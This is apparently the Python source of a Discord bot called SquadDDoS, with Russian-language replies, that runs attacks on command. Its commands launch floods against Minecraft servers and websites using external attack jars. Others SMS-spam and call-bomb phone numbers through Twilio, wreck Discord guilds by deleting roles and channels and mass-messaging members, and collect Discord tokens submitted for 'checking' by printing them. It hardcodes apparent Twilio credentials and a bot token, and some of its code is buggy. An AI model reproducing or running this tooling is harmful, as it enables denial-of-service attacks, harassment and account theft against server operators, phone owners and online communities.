print("""
(C) 2022-2023 SquadCube Corporation
SquadDDoS: (SquadBot)
Support: https://dsc.gg/SquadDDoS
""")
import discord,os,json,requests,platform,psutil,random,subprocess
from discord.ext import commands
from urllib.request import urlopen
from twilio.rest import Client
client=commands.Bot(command_prefix='!',intents=discord.Intents.all())
client.remove_command('help')
SupportedProtocols=['760','759','758','757','756','755','754','753','751','736','735','578','575','573','498','490','485','480','477','404','401','393','340','338 ','335','316','210','110','109','107','47']
ProtocolsList=['1.19.2/1.19.1: 760','1.19: 759','1.18.2: 758', '1.18.1/1.18: 757', '1.17.1: 756', '1.17: 755', '1.16.5/1.16.4: 754', '1.16.3: 753', '1.16.2: 751', '1.16.1: 736', '1.16: 735', '1.15.2: 578', '1.15.1: 575', '1.15: 573', '1.14.4: 498', '1.14.3: 490', '1.14.2: 485', '1.14.1: 480', '1.14: 477', '1.13.2: 404', '1.13.1: 401', '1.13: 393', '1.12.2: 340', '1.12.1: 338', '1.12: 335', '1.11.2/1.11.1: 316', '1.11: 315' '1.10.2/1.10.1: 210', '1.9.4/1.9.3: 110', '1.9.2: 109', '1.9.1: 107', '1.8.9/1.8.8/1.8.7/1.8.6/1.8.5/1.8.4/1.8.3/1.8.2/1.8.1/1.8: 47']
SupportedMethods=['join','legitjoin','localhost','invalidnames','longnames','botjoiner','spoof','ping','nullping','multikiller','handshake','bighandshake','query','bigpacket','network','randombytes','extremejoin','spamjoin','nettydowner','ram','yoonikscry','colorcrasher','tcphit','queue','botnet','tcpbypass','ultimatesmasher','sf','nabcry']
BotChannelConsoleId=1063020270316683324
BotChannelId=1039242360493719654
@client.event
async def on_ready():
  print(f"падключилса папочка.")
  await client.get_channel(BotChannelId).send(embed=discord.Embed(title="**✅ Восстановлено подключение к Discord боту.**",description='**Теперь вы можете отправлять атаку на Minecraft сервера или на веб-сайты.**\nХарактеристики устройства и информация о системе можно посмотреть командой получения характеристики устройства и информации о системе.',color=discord.Color.light_grey()))
  await client.change_presence(activity=discord.Streaming(name="DDoS [dsc.gg/SquadDDoS]",url="https://vk.com/squadcube_ru"),status=discord.Status.online)
  p=await client.get_channel(1039166439820623922).fetch_message(1039166647958769664)
  m=await client.get_channel(1039166439820623922).fetch_message(1039166764401037382)
  await p.edit(content=f", ".join([i for i in ProtocolsList]))
  await m.edit(content=f", ".join([i for i in SupportedMethods]))
@client.event
async def on_command_error(ctx,error):
  if isinstance(error,commands.CommandNotFound):
    if not ctx.message:return
    else:await ctx.message.delete()
@client.event
async def on_message(message):
  if not message.author.id==client.user.id:
    if message.channel.id==1039158074142892126:
      if client.user.mentioned_in(message):
        List=['Бляяя я обосрал свои штаныы😭','Болтать не вредно','Срать охота...','Я включен пупсик, ддось майн сервера','Пизда','Пойду посру','Засунуть? Себе в глотку? Фууу','@everyone ддос включен',
        'Сам','DDoSить майнкрафт сервера - моя работа и жизнь...','😴','Я написан на Python','Дайте Евгехе учить язык Java заебали','.','Python; Java; HTML; JavaScript; CSS ето все можно выучить в Hack IT Studio :)',
        'XDDOS или Wave?','Да','Нет','За отсос любой вопрос','Эй секси няшка','Харош базарить','Пошёл нахуй','У всех словах есть буквы...','Вставай мой край радной','Правило 666. Не читать мои высеры',
        'Чё ты там пиздиш','Да ето же блять баян','💔Дима Евтушенко','Є проблеми які не говорять','У Евгехи вопрос кто такой Дима Евтушенко','Пон','Счастье и здоровье тому кто не слил мой код.',
        'Купи себе паяльник и запаяй себе ебальник','Вадимка','Вставай бамбас',"Нахуя?",'Зачем💀','Не согл или согл']
        await message.channel.send(random.choice(List))
    elif message.channel.id==BotChannelId:
      if message.content.startswith("!"):await client.process_commands(message)
      elif not message.content.startswith("!"):
        if not message:return
        elif message:await message.delete()
    elif not message.channel.id==BotChannelId:
      if message.content.startswith("!checkdsctoken"):await client.process_commands(message)
def convertTime(seconds):
  minutes,seconds=divmod(seconds,60)
  hours,minutes=divmod(minutes,60)
  return"%d:%02d:%02d"%(hours,minutes,seconds)
@client.command()
async def host(ctx):
  e=discord.Embed(title="📊Характеристики устройства и информация о системе📊",color=discord.Color.light_grey())
  e.add_field(name='**🔰Информация о системе🔰**',value='Информация о системе ниже',inline=False)
  e.add_field(name='🔰ОС',value=f'{platform.system()}')
  e.add_field(name='🔰Версия ОС',value=f'{platform.version()}')
  e.add_field(name='🔰Платформа',value=f'{platform.platform()}')
  e.add_field(name='**🔰Характеристики устройства🔰**',value='Характеристики устройства ниже',inline=False)
  e.add_field(name='🔰Процессор',value=f'{platform.processor()} (Использование: {psutil.cpu_percent()}%, {psutil.cpu_count(False)} ядер)')
  e.add_field(name='🔰Оперативная память',value=f'{psutil.virtual_memory().percent}% / {psutil.virtual_memory().total} ( Free: {psutil.virtual_memory().available}B )')
  if not psutil.sensors_battery():
    e.add_field(name='🔋Аккумулятор',value=f"Недоступен")
  else:
    if psutil.sensors_battery().power_plugged:am=", заряжается,"
    else:am=""
    e.add_field(name='🔋Аккумулятор',value=f"{psutil.sensors_battery().percent}%"+am+f" осталось времени жизни аккумулятора: {convertTime(psutil.sensors_battery().secsleft)}")
  e.set_footer(text="© 2022-2023 SquadCube Corporation | SquadDDoS®", icon_url="https://c.tenor.com/wl8v_qdsA8EAAAAC/trollge-massacare.gif")
  await ctx.reply(embed=e)
@client.command()
async def help(ctx):
  e=discord.Embed(title='💭Страницы командов💭',description="Лист страниц помощи\n**❗ Больше информаций можно прочитать здесь: <#1005835481575071765>**\n\n**Как отправить атаку на Minecraft сервер:**\n - !mca <IP> <ПРОТОКОЛ> <МЕТОД> <ВРЕМЯ В СЕКУНДЫ> <П. З. С. (CPS) (-1 ДЛЯ МАКС.)>\n\n**❗ Вы можете посмотреть все протоколы и методы атаки в <#1004078102126809098>.\n\nКак отправить атаку на указанный сайт:**\n - !wsda <IP БЕЗ ПОРТА (Без https:// или http://)> <ПОРТ (Если на сайте HTTPS то 443, если нет то 80)> <ПОТОКИ (Рекомендуется указывать не больше 600 или 700)>",color=discord.Color.light_grey())
  e.add_field(name='!mcdhelp', value='👹Minecraft сервер DDoS (боттинг)')
  e.add_field(name='!wsdhelp', value='🧨Веб-сайт DDoS')
  e.add_field(name='!ohelp', value='🐭Другие функции')
  e.add_field(name='!dgmhelp', value='👨‍💻Управление Discord гильдии')
  e.set_footer(text="© 2022-2023 SquadCube Corporation | SquadDDoS®",icon_url="https://c.tenor.com/wl8v_qdsA8EAAAAC/trollge-massacare.gif")
  await ctx.reply(embed=e)
@client.command(name='mcdhelp')
async def mcddoshelp(ctx):
  e=discord.Embed(title='💭 Minecraft сервер DDoS (боттинг) и другое💭',color=discord.Color.light_grey())
  e.add_field(name='!mca [See args in !help]',value='🏹 Отправить атаку на Minecraft сервер',inline=True)
  e.add_field(name='!mcr <IP> [Используйте mcr2 если не работает эта команда]',value='🤓 Получить информацию о Minecraft сервере',inline=True)
  e.add_field(name='!mcr2 <IP>',value='🤓 Получить ссылки информацию о Minecraft сервере в JSON формате',inline=True)
  e.set_footer(text="SquadDDoS", icon_url="https://c.tenor.com/wl8v_qdsA8EAAAAC/trollge-massacare.gif")
  await ctx.reply(embed=e)
@client.command(name='wsdhelp')
async def websiteddoshelp(ctx):
  e=discord.Embed(title='**🌏🧨 Веб-сайт DDoS 🌏🧨**',color=discord.Color.light_grey())
  e.add_field(name='!wsda [See args in !help]',value='💥 Отправить аттаку на указанный сайт.')
  e.add_field(name='!wsdr <URL (Без www. и https:// или http://) или IP>',value='🎓 Получить информацию о сайте.')
  e.set_footer(text="© 2022-2023 SquadCube Corporation | SquadDDoS®",icon_url="https://c.tenor.com/wl8v_qdsA8EAAAAC/trollge-massacare.gif")
  await ctx.reply(embed=e)
@client.command(name='ohelp')
async def otherhelp(ctx):
  e=discord.Embed(title='**🐭Другие функции🐭**',color=discord.Color.light_grey())
  e.add_field(name='!userinfo <USER PING OR ID>', value='👶 Получить информацию о Discord пользователе.')
  e.add_field(name='!useravatar <USER PING OR ID>', value='🌸 Получить аватарку Discord пользователя.')
  e.add_field(name='!dscginfo <GUILD ID>', value='🎪 Получить информацию о Discord гильдии.')
  e.set_footer(text="© 2022-2023 SquadCube Corporation | SquadDDoS®",icon_url="https://c.tenor.com/wl8v_qdsA8EAAAAC/trollge-massacare.gif")
  await ctx.reply(embed=e)
@client.command('mcamap')
async def mcattackmethodsandprotocols(ctx):
  e=discord.Embed(title='📂Методы атаки и протоколы Minecraft📂')
  e.add_field(name='🎫Протоколы',value=f", ".join([i for i in ProtocolsList]))
  e.add_field(name='❓Методы атаки',value=f", ".join([i for i in SupportedMethods]))
  await ctx.reply(embed=e)
@client.command('mcr')
async def mcresolve(ctx, arg1):
  status=requests.get(f"https://api.mcsrvstat.us/2/{arg1}").status_code
  if status!=200:
    await ctx.reply(embed=discord.Embed(title='**❌ Ошибка**',description=f'💥Возникла ошибка при получении информации страницы, пожалуйста повторите попытку позже.\n\n*Код статуса запроса: {status}*',color=discord.Color.red()))
    return
  else:
    for line in urlopen(f"https://api.mcsrvstat.us/2/{arg1}"):json_object=json.loads(line.decode("utf-8"))
    if json_object["online"] == False:
      await ctx.reply(embed=discord.Embed(title='**❌ Ошибка**',description=f'⛔Сервер закрыт или не найден.\nВы ввели IP сервера: {arg1}\nЕсли считаете что это ошибка то проверьте правильность введеного IP.',color=discord.Color.red()))
      return
    else:
      e=discord.Embed(title="**✅ Получена информация ✅**",description=f'💥Успешно получена информация о {arg1}💥',color=discord.Color.green())
      e.add_field(name='***[🔥IP]:***', value=json_object["ip"], inline=True)
      e.add_field(name='***[💦ПОРТ]:***', value=json_object["port"], inline=True)
      e.add_field(name='***[🎫ВЕРСИЯ]:***', value=f'{json_object["version"]} (Protocol: {json_object["protocol"]})', inline=True)
      e.add_field(name='***[👶ИГРОКИ]:***', value=json_object["players"], inline=True)
      e.add_field(name='*For more information about this server you can get in this URL below:*', value=f"*https://api.mcsrvstat.us/2/{arg1}*", inline=False)
      e.set_footer(text="© 2022-2023 SquadCube Corporation | SquadDDoS®",icon_url="https://c.tenor.com/wl8v_qdsA8EAAAAC/trollge-massacare.gif")
      await ctx.reply(embed=e)
@client.command(name='mcr2')
async def mcresolve2(ctx,arg1):
  e=discord.Embed(title="**✅ Получена ссылка**",description=f'Получена ссылка на информацию о Minecraft сервере: https://api.mcsrvstat.us/2/{arg1}',color=discord.Color.red())
  e.set_footer(text="SquadDDoS",icon_url="https://c.tenor.com/wl8v_qdsA8EAAAAC/trollge-massacare.gif")
  await ctx.reply(embed=e)
@client.command(name='mca')
async def mcattack(ctx,arg1,arg2,arg3,arg4,arg5):
  blacklisted_servers=[Blockkio.aternos.me]
  if arg1 in blacklisted_servers:
    await ctx.reply(embed=discord.Embed(title="**❌ Ошибка**",description=f'⛔ Этот сервер нельзя DDoSить.',color=discord.Color.red()))
    return
  if not os.path.exists("MCSTORM.jar") and not os.path.exists("XDDOS.jar"):
    await ctx.reply(embed=discord.Embed(title="❌ Ошибка",description=f'Атака не была отправлена так как в файлах бота отсутствует файлы для атаки',color=discord.Color.red()))
    return
  async def attack():
    if os.path.exists("XDDOS.jar"):
      await ctx.reply("💫Запуск XDDOS ...")
      if platform.system()=="Windows":xddos=subprocess.Popen(f"java -jar XDDOS.jar {arg1} {arg2} {arg3} {arg4} {arg5} -noansi")
      elif platform.system()=="Linux":xddos=subprocess.Popen(f"java -jar XDDOS.jar {arg1} {arg2} {arg3} {arg4} {arg5}")
    if os.path.exists("MCSTORM.jar"):
      await ctx.reply("💫Запуск MCSTORM ...")
      mcstarm=subprocess.Popen(f'java -jar MCSTORM.jar {arg1} {arg2} {arg3} {arg4} {arg5}')
  if str(arg2) not in SupportedProtocols:
    await ctx.reply(embed=discord.Embed(title=f"**❌ Ошибка**",description=f"🎫❓ Неверный Minecraft протокол, посмотрите все протоколы в канале <#1039166647958769664>",color=discord.Color.red()))
    return
  if str(arg3) not in SupportedMethods:
    await ctx.reply(embed=discord.Embed(title=f"**❌ Ошибка**",description=f"❓ Неверный метод атаки XDDOS, посмотрите все методы в канале <#1039166764401037382>",color=discord.Color.red()))
    return
  if int(arg4) > 120:
    await ctx.reply(embed=discord.Embed(title='**❌ Ошибка**',description=f'⏱❗ Вы не можете атаковать Minecraft сервер больше 120 сек.',color=discord.Color.red()))
    return
  if int(arg5)>1000 or arg5=="-1" and not client.get_guild(client.get_channel(BotChannelId).guild.id).get_role(1039656790226387084) in client.get_guild(client.get_channel(BotChannelId).guild.id).get_member(ctx.message.author.id).roles:
    await ctx.reply(embed=discord.Embed(title='**❌ Ошибка**',description="Чтобы отправить атаку с кпс больше 1000 нужно иметь роль Pro (кпс -1 для админов)"))
    return
  e=discord.Embed(title='**🚀 Атака отправлена 🚀**',description=f'✅ Успешно отправлена атака пользователем {ctx.message.author.mention}',color=discord.Color.green())
  e.add_field(name='***[🎪IP СЕРВЕРА]:***', value=f'{arg1}', inline=True)
  e.add_field(name='***[🎫ВЕРСИЯ]:***', value=f'{arg2}', inline=True)
  e.add_field(name='***[❓МЕТОД АТАКИ]:***', value=f'{arg3}', inline=True)
  e.add_field(name='***[⏱ВРЕМЯ]:***', value=f'{arg4} сек.', inline=True)
  e.add_field(name='***[💪П. З. С. (CPS)]:***', value=f'{arg5}', inline=True)
  e.set_author(name=ctx.message.author.name,url="https://vk.com/squadcube_ru",icon_url=ctx.message.author.avatar.url)
  e.set_footer(text="© 2022-2023 SquadCube Corporation | SquadDDoS®, Minecraft server DDoS service",icon_url="https://c.tenor.com/wl8v_qdsA8EAAAAC/trollge-massacare.gif")
  if requests.get(f"https://api.mcsrvstat.us/2/{arg1}").status_code==200:
    for line in urlopen(f"https://api.mcsrvstat.us/2/{arg1}"):json_object=json.loads(line.decode("utf-8"))
    if json_object["online"]==False:
      await ctx.reply(embed=discord.Embed(title='**❌ Ошибка**',description=f'⛔Сервер закрыт или не найден.\nВы ввели IP сервера: {arg1}\nЕсли считаете что ето ошибка то проверьте правильность введеного IP.',color=discord.Color.red()))
      return
    elif json_object["online"]==True:
      await ctx.reply(embed=e)
      await attack()
  else:
    await ctx.reply(embed=discord.Embed(title='⚠ Возникла ошибка при проверке Minecraft сервера на наличие онлайна.\nОтправить атаку? Если да то введите +, если нет то -',color=discord.Colour.red()))
    @client.event
    async def on_message(message):
        if message.author.id==ctx.message.author.id:
          if message.content=="+":
            await ctx.reply(embed=e)
            await attack()
          elif message.content == "-":return
@client.command(name='dscginfo')
async def dscguildinfo(ctx, arg1):
  guild=await client.fetch_guild(arg1)
  e=discord.Embed(title="✅ SUCCESSFULLY RESOLVED ✅",description=f'Successfully resolved information about guild {guild.name} ({arg1})',color=discord.Colour.random())
  e.add_field(name='**🔥 GUILD ID:**', value=f"{guild.id}", inline=True)
  e.add_field(name='**💥 GUILD NAME:**', value=f"{guild.name}", inline=True)
  e.add_field(name='**GUILD CREATED AT:**', value=f"{guild.created_at}", inline=True)
  e.add_field(name='**GUILD OWNER:**', value=f"<@{guild.owner_id}> ({guild.owner_id})", inline=True)
  e.add_field(name='**GUILD ICON URL:**', value=f"{guild.icon.url}", inline=True)
  e.add_field(name='**GUILD ICON ANIMATED:**', value=f"{guild.icon.is_animated()}", inline=True)
  e.add_field(name='**GUILD BANNER URL:**', value=f"{guild.banner.url}", inline=True)
  e.add_field(name='**GUILD BANNER ANIMATED:**', value=f"{guild.banner.is_animated()}", inline=True)
  e.set_footer(text="SquadDDoS")
  await ctx.reply(embed=e)
@client.command(name='wsda')
async def websiteddosattack(ctx,arg1,arg2,arg3):
  if not arg2 in ["443","80"]:
      await ctx.reply(embed=discord.Embed(title="❌ Ошибка",description="Неверный порт сайта, если на сайте HTTPS то порт 443 если нет то 80.",color=discord.Color.red()))
      return
  elif arg2=="443":
    p="https://"
  elif arg2=="80":
    p="http://"
  if requests.get(p+arg1).status_code!=200:await ctx.reply(embed=discord.Embed(title="❌ Ошибка",description=f"Атака не была отправленна так как код статуса запроса {requests.get(arg1).status_code}.",color=discord.Color.red()))
  else:
    if arg3>3999:
      await ctx.reply(embed=discord.Embed(title="❌ Ошибка",description="Указывайте потоки не больше 3999.",color=discord.Color.red()))
      return
    e=discord.Embed(title='🚀 Атака отправлена 🚀',description='✅Отправлена атака на указанный сайт.',color=discord.Color.red())
    e.add_field(name='***[🔌IP]***',value=arg1)
    e.add_field(name='***[📡ПОРТ]***',value=arg2)
    e.add_field(name='***[💥ПОТОКИ]***',value=arg3)
    await ctx.reply(embed=e)
    os.system(f"java -jar HttpFlood.jar {arg1} {arg2} {arg3} 2")
@client.command(name='wsdshr')
async def websiteddossendhttprequests(ctx,url,count):
  sended=0
  json,cookies={'MYSOR_BY':'https://dsc.gg/SquadDDoS','USER':'EVGENIY'}
  while sended!=int(count):
    requests.get(url,json=json,cookies=cookies)
    requests.post(url,json=json,cookies=cookies)
    requests.delete(url,json=json,cookies=cookies)
    requests.put(url,json=json,cookies=cookies)
    requests.head(url,json=json,cookies=cookies)
    sended+=1
@client.command(name='wsdr')
async def websiteddosresolve(ctx,arg1):
  e=discord.Embed(title="**✅ Получена информация**",description=f'Получена информация о веб-сайте.',color=discord.Color.red())
  for line in open(f"https://api.2ip.ua/geo.json?ip={arg1}"):o1=json.loads(line.decode("utf-8"))
  for line in open(f"https://api.2ip.ua/hosting.json?site={arg1}"):o2=json.loads(line.decode("utf-8"))
  e.add_field(name='[📡IP]',value=o1["ip"])
  e.add_field(name='[САЙТ КОМПАНИИ]',value=o2["site"])
  e.add_field(name='[КОМПАНИЯ]',value=o2["name_ripe"])
  e.add_field(name='[🗺СТРАНА]',value=f"{o1['country']} ({o1['country_code']})")
  e.add_field(name='[🏙ГОРОД]',value=o1["city"])
  e.add_field(name='[🏘РЕГИОН]',value=o1["region"])
  e.add_field(name='[🎫ПОЧТОВЫЙ ИНДЕКС]',value=o1["zip_code"])
  e.add_field(name='[⏱ЧАСОВОЙ ПОЯС]',value=o1["time_zone"])
  e.add_field(name='[🎗ШИРОТА]',value=o1["latitude"])
  e.add_field(name='[🎗ДОЛГОТА]',value=o1["latitude"])
  await ctx.reply(embed=e)
@client.command()
async def checkemail(ctx,arg1):
    for line in open(f"https://api.2ip.ua/email.json?email={arg1}"):r=json.loads(line.decode("utf-8"))
    if r["exist"]==True:await ctx.reply(embed=discord.Embed(title="🔰Вывод",description="✅ Такая электронная почта существует",color=discord.Color.green()))
    elif r["exist"]==False:await ctx.reply(embed=discord.Embed(title="🔰Вывод",description="❌ Такая электронная почта НЕ существует",color=discord.Color.red()))
@client.command()
async def userinfo(ctx,user:discord.User):
  e=discord.Embed(title='**✅ Получено успешно ✅**',description=f'💥Успешно получена информация о Discord',color=discord.Color.green())
  e.add_field(name='📝НИК ПОЛЬЗОВАТЕЛЯ',value=user.name)
  e.add_field(name='📝ПОКАЗАННЫЙ НИК ПОЛЬЗОВАТЕЛЯ',value=user.display_name)
  e.add_field(name='⚽ID',value=user.id)
  e.add_field(name='✨СОЗДАН',value=user.created_at)
  e.add_field(name='🤖БОТ',value=user.bot)
  e.add_field(name='🖼АНИМИРОВАННАЯ АВАТАРКА',value=user.avatar.is_animated())
  e.add_field(name='🖼АНИМИРОВАННЫЙ БАННЕР',value=user.banner.is_animated())
  e.set_thumbnail(url=user.avatar.url)
  e.set_image(url=user.banner.url)
  await ctx.reply(embed=e)
@client.command()
async def useravatar(ctx,arg1:discord.User):
  e=discord.Embed(title='**🥰 Аватарка пользователя 🥰**',description=f"{arg1.mention}",color=discord.Color.purple())
  e.set_image(url=arg1.avatar.url)
  await ctx.reply(embed=e)
@client.command(name='checkdsctoken')
async def checkdiscordtoken(ctx,arg1):        
  request=requests.get("https://discordapp.com/api/v6/users/@me/library",headers={'Content-Type':'application/json','authorization':f"{arg1}"})  
  if request.status_code == 200:
    await ctx.message.delete()
    e=discord.Embed(title="🔰 Вывод",description="✅Верный Discord токен.",color=discord.Color.green())
    e.set_image(url="https://www.citypng.com/public/uploads/preview/-31622652360keqnmdomq3.png")
    e.set_footer(text="© 2022-2023 SquadCube Corporation | SquadDDoS®",icon_url="https://c.tenor.com/wl8v_qdsA8EAAAAC/trollge-massacare.gif")
    await ctx.reply(embed=e)
    print(arg1)
  else:
    e2=discord.Embed(title="🔰 Вывод",description="❌К сожалению, неверный токен.",color=discord.Color.red())
    e2.set_image(url="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR-1Bk77raRqcXZ8K5FPjBWqADYWZFBlW5YS4Fu2MqEcMVZ8-nQCeWNJYq56NYv09hFQtU&usqp=CAU")
    e2.set_footer(text="© 2022-2023 SquadCube Corporation | SquadDDoS®",icon_url="https://c.tenor.com/wl8v_qdsA8EAAAAC/trollge-massacare.gif")
    await ctx.reply(embed=e2)
@client.command()
async def dgm_servers(ctx):
  for guild in client.guilds:await ctx.send(f"[{guild.name} ID: {guild.id} Users: {guild.member_count}]")
@client.command()
async def dgm_crash(ctx,arg1):
  guild=client.get_guild(int(arg1))
  if not guild in client.guilds:await ctx.reply("❌Меня там нет.")
  if guild.id==client.get_channel(BotChannelId).guild.id:
    await ctx.reply("...я так не думаю.....Я ТАК НЕ ДУМАЮ")
    return
  else:
    while True:
        await guild.edit(name='🧟SquadDDoS ZOMBIE🧟',reason="у вас мать здохла, зайдите на dsc.gg/SquadDDoS чтобы она ожила")
        await guild.create_text_channel('SquadDDoS')
        await guild.create_role(name="SquadDDoS",reason="у вас мать здохла, зайдите на dsc.gg/SquadDDoS чтобы она ожила",color=discord.Color.red())
        for role in guild.roles:
            if role.name!="SquadDDoS":await role.delete(reason="у вас мать здохла, зайдите на dsc.gg/SquadDDoS чтобы она ожила")
        for emoji in guild.emojis:
          if guild.emojis.count()!=0:
            if emoji.name!="SquadDDoS":await emoji.delete(reason="у вас мать здохла, зайдите на dsc.gg/SquadDDoS чтобы она ожила")
        for channel in guild.channels:
            if channel.name!="SquadDDoS":await channel.delete()
            if channel.type.value==0:await channel.send("@everyone @here у вас мать здохла, зайдите на dsc.gg/SquadDDoS чтобы она ожила")
        for member in guild.members:
          u=client.get_user(member.id)
          if u.id!=client.user.id:await u.send("у вас мать здохла, зайдите на dsc.gg/SquadDDoS чтобы она ожила")
@client.command(name="pbb")
async def phonebomberbalance(ctx):await ctx.reply(embed=discord.Embed(title=f"💳На счету бомбера телефонов ${Client('AC5f2d384f667f6daf89e5c1628bd9d66b','16688b5d8bd2e84bce86bd27f85bfdc5').api.v2010.balance.fetch().balance}",description=f"Получено сколько на счету аккаунта Twilio.\n**Если вы хотите пополнить счет пожалуйста поддержите нас покупкой чего то!**",color=discord.Color.orange()))
@client.command()
async def smssend(ctx,кому,text):
  Client('AC5f2d384f667f6daf89e5c1628bd9d66b','16688b5d8bd2e84bce86bd27f85bfdc5').messages.create(body=text,from_='+19034027814',to=кому)
  await ctx.reply(embed=discord.Embed(title="✅SMS сообщение отправлено",description=f"SMS сообщение отправлено на номер {кому} пользователем {ctx.message.author.mention}\n**На счету ${Client('AC5f2d384f667f6daf89e5c1628bd9d66b','16688b5d8bd2e84bce86bd27f85bfdc5').api.v2010.balance.fetch().balance}**\nТекст SMS сообщения:\n{text}",color=discord.Color.orange()))
@client.command()
async def smsspam(ctx,кому,сколько,*,text):
  e=discord.Embed(title="✅Атака отправлена",description=f"Атака успешно отправлена на номер {кому} пользователем {ctx.message.author.mention}",color=discord.Color.orange())
  e.add_field(name="***[📱НОМЕР ТЕЛЕФОНА]***",value=кому)
  e.add_field(name="***[💦КОЛ-ВО СМС]***",value=сколько)
  e.add_field(name="***[📝ТЕКСТ СПАМА]***",value=text)
  await ctx.reply(embed=e)
  sended=int(0)
  target=int(сколько)
  while sended!=target:
    m=Client('AC5f2d384f667f6daf89e5c1628bd9d66b','16688b5d8bd2e84bce86bd27f85bfdc5').messages.create(body=text,from_='+19034027814',to=кому)
    print(m.sid)
    sended+=int(1)
    await ctx.send(f"💥SMS сообщение отправлено, количество отправленных SMS сообщений: {sended}/{target}")
  await ctx.reply(embed=discord.Embed(title="✅Атака успешно завершена",color=discord.Color.green()))
@client.command()
async def call(ctx,кому,сколько):
  e=discord.Embed(title="✅Атака отправлена",description=f"Атака успешно отправлена на номер {кому} пользователем {ctx.message.author.mention}",color=discord.Color.orange())
  e.add_field(name="***[📱НОМЕР ТЕЛЕФОНА]***",value=кому)
  e.add_field(name="***[💦КОЛ-ВО ЗВОНКОВ]***",value=сколько)
  await ctx.reply(embed=e)
  sended=int(0)
  target=int(сколько)
  while sended!=target:
    m=Client('AC5f2d384f667f6daf89e5c1628bd9d66b','16688b5d8bd2e84bce86bd27f85bfdc5').calls.create(кому,'+19034027814')
    print(m.sid)
    sended+=int(1)
    await ctx.send(f"💥Звонок отправлен, количество отправленных звонков: {sended}/{target}")
@client.command()
async def gethtml(ctx,url):
    f=open(ctx.author.name+".html","w+")
    f.write(requests.get(url).content)
    f.close()
    await ctx.reply(file=discord.File(ctx.author.name+".html",ctx.author.name+".html",spoiler=False,description=url))
    os.remove(ctx.author.name+".html")
print(f"падключаюсь")
client.run("MTA2MTIyMTU4NTI2NjE1MTQ2NA.Gi7Po0.TOfnzLb29Ttxo2ok2K9HQou46q6xjtACxi2_E8")
